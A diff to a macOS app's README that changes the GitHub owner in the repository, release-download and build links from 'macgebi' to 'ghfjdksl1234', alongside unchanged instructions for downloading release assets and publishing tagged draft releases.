@@ -1,10 +1,10 @@
 # GitHub builds and releases
 
-Repository: [macgebi/mac_mouse_helper](https://github.com/macgebi/mac_mouse_helper).
+Repository: [ghfjdksl1234/mac_mouse_helper](https://github.com/ghfjdksl1234/mac_mouse_helper).
 
 ## Download the app
 
-**[Download for macOS](https://github.com/macgebi/mac_mouse_helper/releases/latest/download/Where-is-My-Mouse-macOS-universal.zip)** — no GitHub account required.
+**[Download for macOS](https://github.com/ghfjdksl1234/mac_mouse_helper/releases/latest/download/Where-is-My-Mouse-macOS-universal.zip)** — no GitHub account required.
 
 1. On the repository page, open **Releases** in the right sidebar and choose the latest release.
 2. Under **Assets**, download **Where-is-My-Mouse-macOS-universal.zip**. Choose this app ZIP, not the source-code archives.
@@ -44,7 +44,7 @@ git push origin "v$release_version"
 
 The workflow checks the tag against the app version, builds the app, and creates a **draft** release containing the ZIP and checksum. Review its notes and click **Publish release** when ready. A rerun can refresh a draft's assets, but refuses to replace assets of an already published release. Never reuse a published version tag for a different build.
 
-For future releases, push the tag and let Actions prepare its draft before publishing. Creating a release in the GitHub UI does not trigger this workflow’s release job. The first public release, v1.0.4, was published from the verified ZIP and checksum of the existing successful [build #12](https://github.com/macgebi/mac_mouse_helper/actions/runs/35419930100).
+For future releases, push the tag and let Actions prepare its draft before publishing. Creating a release in the GitHub UI does not trigger this workflow’s release job. The first public release, v1.0.4, was published from the verified ZIP and checksum of the existing successful [build #12](https://github.com/ghfjdksl1234/mac_mouse_helper/actions/runs/35419930100).
 
 ## First-launch approval and future signing
 
